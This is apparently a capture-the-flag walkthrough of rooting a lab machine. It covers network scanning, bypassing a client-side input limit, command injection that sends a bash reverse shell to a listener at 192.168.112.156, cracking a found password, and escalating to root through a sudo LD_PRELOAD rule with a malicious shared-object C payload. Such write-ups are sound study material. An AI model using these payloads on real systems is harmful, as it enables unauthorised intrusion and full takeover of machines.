---
share_link: https://share.note.sx/4pw2sy1k#VkVHiwk6wr6ImdPXno0yKadnBGLuVaV6Sd9Za7bgUEg
share_updated: 2025-05-09T18:25:36+05:30
---

## Step 1: Reconnaissance – Discovering the Target

We begin by scanning the local network to identify available hosts using:

```bash
sudo arp-scan --local
```

![[Pasted image 20250503031552.png]]

This reveals the target machine with IP: **192.168.112.178**

---

## Step 2: Port Scanning – Identifying Open Services

We run an initial scan to see open ports:

```bash
nmap 192.168.112.178
```

![[Pasted image 20250503031626.png]]

Ports **22 (SSH)** and **80 (HTTP)** are open.

To get more detailed info, we run:

```bash
nmap 192.168.112.178 -p22,80 -sCV
```

![[Pasted image 20250503031653.png]]

Apache is running on port 80, but nothing interesting shows up here.

---

## Step 3: Gaining Foothold – Web Exploitation

We visit the web page and notice suspicious behavior in form input handling:

![[Pasted image 20250507224132.png]]

The input field has a 32-character limit, but it's enforced only on the client side. We can bypass this restriction easily using browser developer tools.

This behavior hints at a potential command injection vulnerability. To test it, we inject a reverse shell command:

```bash
bash -c 'exec bash -i &>/dev/tcp/192.168.112.156/1234 <&1'
```


This connects back to our listener and gives us a shell:

![[Pasted image 20250503032028.png]]

Exploring one level down in the directory tree, we find a password file. After downloading it, we use [CrackStation](https://crackstation.net) to successfully crack the password:

![[Pasted image 20250507223829.png]]

![[Pasted image 20250503032134.png]]



---

## Step 4: Privilege Escalation – User Access

Using the cracked password, we SSH into the system as user **pumba**:

![[Pasted image 20250503032246.png]]

---

## Step 5: Root Access – Advanced Privilege Escalation

We check sudo permissions:

![[Pasted image 20250503032354.png]]

Here we find a twist — the command has `env=LD_PRELOAD`, meaning we can inject a shared library into a process.

> **LD_PRELOAD** is an environment variable in Unix-like systems that allows you to load a custom shared library before others. It's often used for hooking or overriding functions at runtime.

We write a malicious shared object to spawn a root shell:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void spawn_shell() {
    setuid(0);
    system("/bin/bash");
}
```

Compile it:

```bash
gcc -shared -fPIC -o /tmp/shell.so shell.c
```

We then execute a binary (like `ls`) using sudo with `LD_PRELOAD` to trigger our payload:

```bash
sudo LD_PRELOAD=/tmp/shell.so ls
```

![[Pasted image 20250503032703.png]]

And just like that — we're root. 🏴‍☠️

---
